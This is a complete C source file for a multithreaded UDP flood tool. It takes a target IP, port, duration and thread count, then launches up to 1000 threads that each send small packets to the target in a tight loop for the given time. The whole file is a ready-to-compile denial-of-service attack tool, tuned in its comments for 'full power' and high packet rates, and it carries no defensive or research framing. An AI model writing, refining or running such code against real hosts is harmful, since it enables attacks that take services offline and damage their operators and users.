#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>

#define MAX_THREADS 1000  // Max threads for full power
#define PACKET_SIZE 64    // Smaller packet size for high PPS

struct AttackParams {
    char target_ip[20];
    int target_port;
    int duration;
    int thread_count;
};

void *udp_flood(void *args) {
    struct AttackParams *params = (struct AttackParams *)args;
    struct sockaddr_in target;
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    target.sin_family = AF_INET;
    target.sin_port = htons(params->target_port);
    target.sin_addr.s_addr = inet_addr(params->target_ip);

    char packet[PACKET_SIZE];
    memset(packet, 0x41, sizeof(packet));
    
    time_t start_time = time(NULL);
    while (time(NULL) - start_time < params->duration) {
        sendto(sock, packet, PACKET_SIZE, 0, (struct sockaddr *)&target, sizeof(target));
    }
    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        printf("Usage: %s <IP> <PORT> <DURATION> <THREADS>\n", argv[0]);
        return 1;
    }
    
    struct AttackParams params;
    strncpy(params.target_ip, argv[1], sizeof(params.target_ip) - 1);
    params.target_port = atoi(argv[2]);
    params.duration = atoi(argv[3]);
    params.thread_count = atoi(argv[4]);
    
    if (params.thread_count > MAX_THREADS) {
        params.thread_count = MAX_THREADS;
    }
    
    pthread_t threads[params.thread_count];
    for (int i = 0; i < params.thread_count; i++) {
        pthread_create(&threads[i], NULL, udp_flood, (void *)&params);
    }
    
    for (int i = 0; i < params.thread_count; i++) {
        pthread_join(threads[i], NULL);
    }
    
    return 0;
}
